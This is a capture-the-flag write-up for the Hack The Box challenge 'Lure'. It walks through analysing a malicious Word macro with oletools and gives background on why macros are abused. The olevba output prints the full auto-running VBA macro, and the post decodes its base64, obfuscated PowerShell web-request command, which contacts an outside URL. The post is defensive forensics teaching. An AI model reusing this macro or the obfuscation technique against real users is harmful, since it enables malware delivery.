---
layout: page
title: "HtB: Lure"
date: 2021-12-12 13:00:00 -0000
tags: ctf forensics
intro: What is a maldoc and why should I care about macros?
---
It's been my experience one of the most common ways for initial compromise of a network is through a malicious email attachment. These attachments can be an executable, zip file, script, or a Microsoft Office document (also known as a maldoc). In this challenge, we're given a Word file to analyze.

## Background

Microsoft Office files (Excel, Word, PowerPoint) all have capability to run VBA code via macros. Legitimate uses for macros can be to automate mundane tasks like data entry, formatting, calculations, or just general mouse clicks within the file. However, macros can also spawn other processes, make network connections, and modify other files on the hard drive making this feature a favorite for abuse.

To easily see if a document has macros, you can check the Developer tab and click "Macros" which will give you a list. To see the actual code, you can click "Visual Basic" under the Developer tab.

![Microsoft Word Developer Tab](/images/hackthebox/lure1.png)

Even though macros are disabled by default, the user is notified and given the option to enable the feature. Many users will click "Enable" on unknown files downloaded from the internet without thinking twice which most often leads to infection.

Apart from user education, the most effective solution is to [disable macros altogether](https://www.cisecurity.org/white-papers/intel-insight-how-to-disable-macros/). Some specific roles and departments may require macros for their day-to-day workflows but it's not common to see everyone in an organization use this feature.

## HtB Challenge: Lure

### Description
> The finance team received an important looking email containing an attached Word document. Can you take a look and confirm if it's malicious?

### Solution

Using `oleid`, we can see there's macros inside the provided .doc file.

```
$ oleid UrgentPayment.doc 
oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: UrgentPayment.doc
 Indicator                      Value                    
 OLE format                     True                     
 Has SummaryInformation stream  True                     
 Application name               b'Microsoft Office Word' 
 Encrypted                      False                    
 Word Document                  True                     
 VBA Macros                     True                     
 Excel Workbook                 False                    
 PowerPoint Presentation        False                    
 Visio Drawing                  False                    
 ObjectPool                     False                    
 Flash objects                  0
```

Now, we can use `olevba` to pull out the data and explain the purpose for some of the code. Take note of the trigger that causes the macro to run. `Document_Open` and `AutoOpen` are commonly used to run the macro without further user interaction.

```
$ olevba UrgentPayment.doc 
olevba 0.56 on Python 3.8.5 - http://decalage.info/python/oletools
===============================================================================
FILE: UrgentPayment.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: UrgentPayment.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: UrgentPayment.doc - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'
' Document_Open Macro
'
'

Dim chkUserDomain As String
Dim strUserDomain As String

chkUserDomain = "MEGABANK.LOCAL"
strUserDomain = Environ$("UserDomain")

If chkUserDomain <> strUserDomain Then

Else

Dim ExecFile As Double
    ExecFile = Shell("pOweRshElL -ec cABPAHcARQByAHMAaABFAGwATAAgACQAKAAtAGoATwBpAE4AKAAoACQAUABzAGgATwBNAGUAWwA0AF0AKQAsACgAIgAkAFAAcwBIAG8ATQBFACIAKQBbACsAMQA1AF0ALAAiAHgAIgApADsAKQAoAGkAdwByACAAJAAoACgAIgB7ADUAfQB7ADIANQB9AHsAOAB9AHsANwB9AHsAMAB9AHsAMQA0AH0AewAzAH0AewAyADEAfQB7ADIAfQB7ADIAMgB9AHsAMQA1AH0AewAxADYAfQB7ADMAMQB9AHsAMgA4AH0AewAxADEAfQB7ADIANgB9AHsAMQA3AH0AewAyADMAfQB7ADIANwB9AHsAMgA5AH0AewAxADAAfQB7ADEAfQB7ADYAfQB7ADIANAB9AHsAMwAwAH0AewAxADgAfQB7ADEAMwB9AHsAMQA5AH0AewAxADIAfQB7ADkAfQB7ADIAMAB9AHsANAB9ACIALQBmACAAIgBCACIALAAiAFUAIgAsACIANAAiACwAIgBCACIALAAiACUANwBEACIALAAiAGgAdAAiACwAIgBSAF8AZAAiACwAIgAvAC8AbwB3AC4AbAB5AC8ASABUACIALAAiAHAAOgAiACwAIgBUACIALAAiADAAIgAsACIAXwAiACwAIgBOACIALAAiAE0AIgAsACIAJQA3ACIALAAiAEUAIgAsACIAZgAiACwAIgAxAFQAIgAsACIAdQAiACwAIgBlACIALAAiADUAIgAsACIAawAiACwAIgBSACIALAAiAGgAIgAsACIAMAAiACwAIgB0ACIALAAiAHcAIgAsACIAXwAiACwAIgBsACIALAAiAFkAIgAsACIAQwAiACwAIgBVACIAKQApACkA", vbNormalFocus)

End If
  
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|pOweRshElL          |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

The PowerShell flag `-e` or `-en` or `-encode` or `-encodedcommand` or . . . almost any other variation you can think of means the following text is base64-encoded. I suspect that is where our data is hidden.

Base64-decoded command: 
```
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))
```

That's pretty obfuscated. Rather than parse it manually, I'm going to defang the command and use PowerShell to reveal the flag. Since `iwr` in PowerShell is short for `Invoke-WebRequest`, I expect the data following that will be a URL of some sort.

Defanged command ready to be executed:
```
$ [System.Web.HttpUtility]::UrlDecode($(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))
```

Defanged output:
```
hxxp://ow[.]ly/HTB{k4REfUl_w1Th_Y0UR_d0CuMeNT5}
```

## References
- [CIS white paper](https://www.cisecurity.org/white-papers/intel-insight-how-to-disable-macros/) on disabling macros
- [OLE tools](https://github.com/decalage2/oletools) by [@decalage](https://twitter.com/decalage2)
- [More maldoc samples for practice](https://github.com/jstrosch/malware-samples/tree/master/maldocs) curated by [@jstrosch](https://twitter.com/jstrosch)